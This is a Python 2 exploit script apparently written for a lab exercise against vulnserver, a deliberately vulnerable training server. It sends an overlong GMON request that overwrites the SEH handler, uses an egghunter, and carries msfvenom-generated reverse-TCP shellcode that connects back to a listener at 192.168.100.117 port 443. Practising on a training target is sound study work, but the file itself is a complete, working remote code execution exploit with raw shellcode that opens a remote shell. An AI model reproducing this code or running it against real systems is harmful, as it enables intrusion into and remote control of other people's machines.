#!/usr/bin/python

import socket
import os
import sys

host = '192.168.100.118'        # Windows VM
port = 9999                     # vulnserver port

nSeh = '\x74\x06\x75\x04' # JZ 6 bytes or JNZ 4 bytes over SEH to reach egghunter
Seh = '\xb4\x10\x50\x62'  # 0x625010b4 - pop ebx, pop ebp, ret -  essfunc.dll
jumpback70 = '\xeb\xb8\x90\x90' # jump back 70 bytes

# Egghunter - EGGH - 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x45\x47\x47\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# Egg + Shellcode
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.117 lport=443 -f c EXINTFUNC=thread -b '\x00'
# x86/shikata_ga_nai chosen with final size 351 bytes
# 351 + 8 = 359 bytes
egg = 'EGGHEGGH'
shellcode = ("\xd9\xf6\xd9\x74\x24\xf4\xbd\xd1\x46\x92\x8f\x58\x31\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\xb9\x55\x70\x7a\xc5\xb2\xf6"
"\x85\x35\x43\x97\x0c\xd0\x72\x97\x6b\x91\x25\x27\xff\xf7\xc9"
"\xcc\xad\xe3\x5a\xa0\x79\x04\xea\x0f\x5c\x2b\xeb\x3c\x9c\x2a"
"\x6f\x3f\xf1\x8c\x4e\xf0\x04\xcd\x97\xed\xe5\x9f\x40\x79\x5b"
"\x0f\xe4\x37\x60\xa4\xb6\xd6\xe0\x59\x0e\xd8\xc1\xcc\x04\x83"
"\xc1\xef\xc9\xbf\x4b\xf7\x0e\x85\x02\x8c\xe5\x71\x95\x44\x34"
"\x79\x3a\xa9\xf8\x88\x42\xee\x3f\x73\x31\x06\x3c\x0e\x42\xdd"
"\x3e\xd4\xc7\xc5\x99\x9f\x70\x21\x1b\x73\xe6\xa2\x17\x38\x6c"
"\xec\x3b\xbf\xa1\x87\x40\x34\x44\x47\xc1\x0e\x63\x43\x89\xd5"
"\x0a\xd2\x77\xbb\x33\x04\xd8\x64\x96\x4f\xf5\x71\xab\x12\x92"
"\xb6\x86\xac\x62\xd1\x91\xdf\x50\x7e\x0a\x77\xd9\xf7\x94\x80"
"\x1e\x22\x60\x1e\xe1\xcd\x91\x37\x26\x99\xc1\x2f\x8f\xa2\x89"
"\xaf\x30\x77\x1d\xff\x9e\x28\xde\xaf\x5e\x99\xb6\xa5\x50\xc6"
"\xa7\xc6\xba\x6f\x4d\x3d\x2d\x50\x3a\x59\xd8\x38\x39\xa1\x23"
"\x02\xb4\x47\x49\x64\x91\xd0\xe6\x1d\xb8\xaa\x97\xe2\x16\xd7"
"\x98\x69\x95\x28\x56\x9a\xd0\x3a\x0f\x6a\xaf\x60\x86\x75\x05"
"\x0c\x44\xe7\xc2\xcc\x03\x14\x5d\x9b\x44\xea\x94\x49\x79\x55"
"\x0f\x6f\x80\x03\x68\x2b\x5f\xf0\x77\xb2\x12\x4c\x5c\xa4\xea"
"\x4d\xd8\x90\xa2\x1b\xb6\x4e\x05\xf2\x78\x38\xdf\xa9\xd2\xac"
"\xa6\x81\xe4\xaa\xa6\xcf\x92\x52\x16\xa6\xe2\x6d\x97\x2e\xe3"
"\x16\xc5\xce\x0c\xcd\x4d\xfe\x46\x4f\xe7\x97\x0e\x1a\xb5\xf5"
"\xb0\xf1\xfa\x03\x33\xf3\x82\xf7\x2b\x76\x86\xbc\xeb\x6b\xfa"
"\xad\x99\x8b\xa9\xce\x8b")

buffer = egg
buffer += shellcode
buffer += '\x41' * 3073 # (3494 - 359 for len(egg+shellcode) - 70 for jump backcode - 
buffer += '\x90' * 30   # jumpback land at the start here
buffer += egghunter
buffer += nSeh
buffer += Seh
buffer += jumpback70
buffer += 'C' * (5012 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()

